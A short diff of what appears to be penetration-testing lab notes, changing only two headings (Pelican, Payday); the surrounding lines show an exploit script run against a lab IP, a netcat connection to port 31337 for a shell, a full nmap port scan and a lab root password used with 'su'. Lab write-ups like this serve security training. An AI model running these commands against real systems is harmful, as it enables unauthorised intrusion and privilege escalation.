@@ -43,7 +43,7 @@ perl 4761.pl 192.168.xxx.xxx
 nc -nv 192.168.xxx.xxx 31337
 ```
 
-### Pelican : gcore
+### Pelican : Exhibitor - gcore
 ```shell
 # port scan
 sudo nmap -sC -sV -Pn -p- 192.168.180.98 -oN 180.98_allport
@@ -102,7 +102,7 @@ su -
 Password: ClogKingpinInning731
 ```
 
-### Payday
+### Payday 
 ```shell
 
 ```
